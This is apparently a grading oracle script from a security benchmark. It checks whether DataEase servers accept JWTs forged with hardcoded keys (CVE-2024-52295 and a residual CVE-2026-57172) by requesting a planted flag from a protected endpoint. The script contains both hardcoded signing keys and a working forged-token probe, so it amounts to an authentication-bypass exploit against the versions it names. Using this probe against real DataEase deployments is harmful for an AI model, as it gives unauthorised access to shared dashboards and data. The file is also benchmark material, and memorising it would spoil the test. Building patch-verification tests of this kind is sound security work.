#!/usr/bin/env python3
"""PatchClosure-Bench oracle for DataEase hardcoded ShareLink JWT key.

Pair: CVE-2024-52295 (original, main-auth hardcoded key) -> CVE-2026-57172
      (residual/incomplete-fix, ShareLink hardcoded key 'link-pwd-fit2cloud').

BENIGN auth-bypass canary. The "attack" is a read of a PLANTED flag
(${PCB_FLAG}) that the harness itself seeds as the name of a passwordless
shared dashboard. Detection = the flag string is returned (HTTP 200) by the
protected endpoint /de2api/dataVisualization/findById IFF the forged JWT was
accepted. No real user data is ever touched.

Setup done by the harness (see repro.log / docker-compose.yml):
  * bring up one real official DataEase image (v2.10.1 / v2.10.23 / v2.10.24)
    + its MySQL + redis;
  * seed a data_visualization_info row  id=RESOURCE_ID, name=${PCB_FLAG},
    create_by=1 (admin);
  * seed a passwordless xpack_share row  (resource_id=RESOURCE_ID, creator=1,
    pwd=NULL, oid=1)  -> ShareSecretManage.getSecret() falls back to defaultPwd.

Two forged-token probes over EXTERNAL HTTP, no valid credentials:
  RESIDUAL (CVE-2026-57172): X-DE-LINK-TOKEN signed with 'link-pwd-fit2cloud'
     -> accepted@v1 (200+flag), blocked@v2 (401 signature-invalid).
  ORIGINAL (CVE-2024-52295): X-DE-TOKEN signed with the old hardcoded main-auth
     key -> reaches flag@v0 (200+flag), blocked@v1 (401 signature-invalid).
"""
import os, sys, json, urllib.request

RESOURCE_ID = 777000777
FLAG = os.environ.get("PCB_FLAG", "PCB_FLAG_de57172_a7f3c9e21b")
RESIDUAL_KEY = "link-pwd-fit2cloud"                       # CVE-2026-57172
ORIGINAL_KEY = "83d923c9f1d8fcaa46cae0ed2aaa81b5"        # CVE-2024-52295

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from jwt_forge import link_token, main_token


def probe(base_url, header_name, token):
    """POST findById with the forged token; return (status, flag_present)."""
    body = json.dumps({"id": RESOURCE_ID, "busiFlag": "dashboard"}).encode()
    req = urllib.request.Request(base_url.rstrip("/") + "/de2api/dataVisualization/findById",
                                 data=body, method="POST")
    req.add_header("Content-Type", "application/json")
    req.add_header(header_name, token)
    try:
        r = urllib.request.urlopen(req, timeout=30)
        text = r.read().decode("utf-8", "replace")
        return r.status, (FLAG in text)
    except urllib.error.HTTPError as e:
        text = e.read().decode("utf-8", "replace")
        return e.code, (FLAG in text)
    except Exception as e:
        return 0, False


def residual_probe(base_url):
    tok = link_token(RESIDUAL_KEY, 1, RESOURCE_ID, 1)
    return probe(base_url, "X-DE-LINK-TOKEN", tok)


def original_probe(base_url):
    tok = main_token(ORIGINAL_KEY, 1, 1)
    return probe(base_url, "X-DE-TOKEN", tok)


def flag_reached(base_url, which="residual"):
    status, hit = (residual_probe if which == "residual" else original_probe)(base_url)
    return bool(hit and status == 200)


if __name__ == "__main__":
    base = sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:18123"
    which = sys.argv[2] if len(sys.argv) > 2 else "residual"
    st, hit = (residual_probe if which == "residual" else original_probe)(base)
    print(json.dumps({"base": base, "probe": which, "status": st,
                      "flag_reached": bool(hit and st == 200)}))
